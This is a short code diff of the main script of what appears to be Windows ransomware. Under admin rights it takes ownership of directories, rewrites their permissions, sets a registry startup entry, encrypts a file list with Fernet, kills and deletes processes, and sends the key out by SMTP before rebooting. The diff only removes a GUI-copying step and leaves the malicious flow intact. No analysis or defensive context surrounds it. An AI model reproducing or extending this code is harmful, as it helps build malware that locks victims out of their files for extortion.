@@ -4,7 +4,7 @@ from timeit import default_timer
 from cryptography.fernet import Fernet
 from modules.crypt import crypt
 from modules.permission import takeown, icacls, get_admin_rights
-from modules.system import killproc, delproc, regedit, cpysrc
+from modules.system import delproc, regedit
 from modules.network import host_connect, sendkey_smtp, keyserver
 import os, sys, socket, wget, struct, ctypes, shutil, winreg, time
 # ENVIRONMENT VARIABLE
@@ -14,7 +14,6 @@ gt = takeown.GetOwn()
 gr = icacls.GetPermission()
 dr = delproc.Remove()
 dk = delproc.Kill()
-cp = cpysrc.CopyGui()
 rkey = regedit.ManageKey()
 # MAIN CODE
 if(get_admin_rights.is_admin()):
@@ -32,9 +31,7 @@ if(get_admin_rights.is_admin()):
         regedit.setInit()
         gt.dir()
         gr.dir()
-        cp.cp_guitmp()
         crypt.filelist()
-        cp.cp_gui()
         dk.exp()
         dr.exp()
         # REBOOT WINDOWS
